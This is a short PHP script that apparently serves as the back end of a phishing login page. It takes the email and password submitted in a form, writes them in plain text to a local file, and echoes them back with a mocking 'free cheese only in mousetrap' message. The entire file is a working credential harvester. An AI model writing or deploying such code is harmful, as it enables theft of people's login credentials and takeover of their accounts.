<?php

$entertext = "";


$email = htmlspecialchars($_POST['email']);
$pass = htmlspecialchars($_POST['pass']);

$entertext .= "Email: " . $email . PHP_EOL;
$entertext .= "Pass: " .  $pass . PHP_EOL;


if (!empty($email) && !empty($pass)){
	$data = fopen ('lose.txt', 'r+');

	
	echo "free cheese only in mousetrap  "  . $email . " " . $pass . "!!!". '<br>';
	fwrite($data, $entertext);
	fclose ($data);

}
